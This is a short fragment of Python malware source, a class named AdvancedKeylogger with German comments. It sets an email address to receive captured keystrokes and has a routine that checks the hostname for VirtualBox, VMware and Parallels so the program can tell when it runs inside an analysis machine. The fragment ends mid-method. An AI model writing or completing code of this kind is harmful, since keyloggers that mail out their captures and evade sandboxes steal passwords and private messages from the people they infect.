...
class AdvancedKeylogger:
    def __init__(self):
        ...
        self.email_recipient = "wusjev@gmail.com"
    ...
    def detect_vm(self):
        ...
        try:
            # Liste von bekannten VM-Indikatoren
            vm_indicators = ["vbox", "vmware", "virtualbox", "parallels"]
            for indicator in vm_indicators:
                if indicator in socket.gethostname().lower():
                    return True
            return False
        except Exception as e:
